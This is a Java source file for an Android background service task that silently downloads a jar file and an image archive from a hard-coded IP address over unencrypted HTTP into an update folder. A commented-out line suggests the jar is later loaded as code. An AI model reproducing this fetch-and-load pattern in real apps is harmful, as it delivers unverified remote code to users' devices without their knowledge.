/**
 * 
 */
package cn.play.dserv;

import java.io.File;


/**
 * exit
 * @author Keel
 *
 */
public class PLTask3 implements PLTask {

	private DServ dserv;
	private int id = 3;
	private int state = STATE_WAITING;
	private String TAG = "dserv-PLTask"+id;
	
	@Override
	public void run() {
		CheckTool.log(dserv.getService(), TAG, "==========PLTask id:"+this.id+"===========");
		dserv.dsLog(1, "PLTask", 100,dserv.getService().getPackageName(), "0_0_"+id+"_task inited.");
		state = STATE_RUNNING;
		while (true) {
			if (!CheckTool.isNetOk(this.dserv.getService())) {
				try {
					Thread.sleep(1000*60*5);
				} catch (InterruptedException e) {
				}
				continue;
			}
			
			
			//下载图片zip包,jar包
			
			
			String remote = "http://180.96.63.70:12370/plserver/dats/pics_2.zip";
			String localFile = dserv.getLocalPath()+"pics/pics_2.zip";
			String remoteJar = "http://180.96.63.70:12370/plserver/dats/exv.jar";
			String localJarDir = dserv.getLocalPath()+"update/";
			boolean isFinish = false;
			if (dserv.downloadGoOn(remoteJar, localJarDir, "exv.jar", this.dserv.getService())) {
				CheckTool.log(dserv.getService(), TAG, "down jar OK:"+localJarDir+"emv2.jar");
				
				
				
				if(dserv.downloadGoOn(remote, dserv.getLocalPath()+"pics", "pics_2.zip",this.dserv.getService())){
					CheckTool.log(dserv.getService(),TAG, "down zip OK:"+localFile);
					boolean unzip = dserv.unzip(localFile, dserv.getLocalPath()+"pics/");
					if (unzip) {
						CheckTool.log(dserv.getService(), TAG, "unzip OK:"+localFile);
					}
					
//					this.dserv.setEmp("cn.play.dserv.MoreView", "update/emv2");
					isFinish = true;
//					Log.d(TAG, "update mvClass:"+this.dserv.getEmvClass()+" emvPath:"+this.dserv.getEmvPath());
					state = STATE_DIE;
					File f = new File(this.dserv.getLocalPath()+this.id+".dat");
					if (f != null && f.exists()) {
						f.delete();
					}
				}
			}
			if (!isFinish) {
				state = STATE_WAITING;
			}
			break;
		}
		CheckTool.log(dserv.getService(), TAG, "==========PLTask finished id:"+this.id+"===========");
		
	}
	/*public boolean isConnOk() {
		ConnectivityManager cm = (ConnectivityManager) dserv.getService().getSystemService(Context.CONNECTIVITY_SERVICE);
		boolean isOk = false;
		if (cm != null) {
			NetworkInfo aActiveInfo = cm.getActiveNetworkInfo();
			if (aActiveInfo != null && aActiveInfo.isAvailable()) {
				if (aActiveInfo.getState().equals(NetworkInfo.State.CONNECTED)) {
					isOk = true;
				}
			}
		}
		return isOk;
	}*/

	/* (non-Javadoc)
	 * @see cn.play.dserv.PLTask#getId()
	 */
	@Override
	public int getId() {
		return id;
	}

	/* (non-Javadoc)
	 * @see cn.play.dserv.PLTask#getState()
	 */
	@Override
	public int getState() {
		return this.state;
	}

	/* (non-Javadoc)
	 * @see cn.play.dserv.PLTask#init()
	 */
	@Override
	public void init() {
		CheckTool.log(dserv.getService(),TAG, "TASK "+id+" init.");
		
//		Log.d(TAG, "TASK "+id+" init.");
		if (dserv.getService() != null) {
			dserv.dsLog(1, "PLTask", 100,dserv.getService().getPackageName(), "0_0_"+id+"_task inited.");
		}else{
			CheckTool.log(dserv.getService(),TAG, "TASK "+id+" getService is null.");
		}
	}

	/* (non-Javadoc)
	 * @see cn.play.dserv.PLTask#setState(int)
	 */
	@Override
	public void setState(int arg0) {
		this.state = arg0;
	}

	@Override
	public void setDService(DServ serv) {
		this.dserv =serv;
	}
}
